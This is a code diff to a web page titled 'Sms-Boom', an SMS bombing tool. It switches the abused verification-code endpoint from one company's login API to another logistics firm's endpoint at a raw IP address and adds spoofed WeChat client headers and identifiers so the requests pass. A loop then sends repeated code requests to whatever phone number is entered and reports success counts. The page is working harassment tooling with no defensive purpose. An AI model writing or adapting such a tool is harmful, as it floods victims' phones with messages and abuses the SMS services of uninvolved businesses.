@@ -80,6 +80,7 @@
             overflow-y: auto;
             color: #616161;
             font-size: 15px;
+            white-space: pre-wrap; /* 保留换行 */
         }
 
         .toast {
@@ -115,7 +116,7 @@
 </head>
 <body>
     <div class="card">
-    <h2>Sms-Boom<h2>
+        <h2>Sms-Boom</h2>
         <div class="input-group">
             <label for="phoneNumber">输入手机号码</label>
             <input type="tel" id="phoneNumber" placeholder="输入手机号码" maxlength="11">
@@ -152,21 +153,29 @@
 
         // 发送短信函数
         async function sendSms(phone) {
-            const url = "https://luxiwuliu.lxhg.com/Account/SendSMS";
+            const url = "http://39.100.102.26/tms-htwl/orderRegisterUser/getPollCode";
             const headers = {
-                "Host": "luxiwuliu.lxhg.com",
                 "Connection": "keep-alive",
+                "Accept": "application/json, text/plain, */*",
+                "openid": "ophXzsyM1oVatsUouipcBYc5BT8c",
+                "appId": "wx7ddd2d0bfd7a16bd",
+                "terminal": "H5",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2417A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.188 Mobile Safari/537.36 XWEB/1260183 MMWEBSDK/20240501 MMWEBID/4037 MicroMessenger/8.0.50.2701(0x2800323E) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2417A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.188 Mobile Safari/537.36",
-                "Accept": "*/*",
-                "Origin": "https://luxiwuliu.lxhg.com",
-                "Referer": "https://luxiwuliu.lxhg.com/Account/Login"
+                "Origin": "http://gzh.scmmgr.com",
+                "X-Requested-With": "com.tencent.mn",
+                "Referer": "http://gzh.scmmgr.com/",
+                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
             };
 
             const data = new URLSearchParams({
-                phone: phone,
-                Type: 2,
-                LoginUserName: ""
+                "mobileNo": phone,
+                "machineId": "ophXzsyM1oVatsUouipcBYc5BT8c",
+                "tenantId": "101",
+                "companyId": "1001",
+                "terminal": "H5",
+                "module": "login"
             });
 
             try {
@@ -240,10 +249,10 @@
                     console.log(`发送进度: ${i}/${loopCount}, 成功: ${success}, 失败: ${failed}, 最后响应: ${bodyStr}`);
 
                     resultText.textContent = `发送进度: ${i}/${loopCount}\n成功: ${success}\n失败: ${failed}\n最后响应: ${bodyStr}`;
-
                 } catch (err) {
                     failed += 1;
                     console.error("发送错误：", err);
+                    resultText.textContent += `\n发送错误: ${err}`;
                 }
 
                 // 短暂延迟避免请求过快
@@ -256,4 +265,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
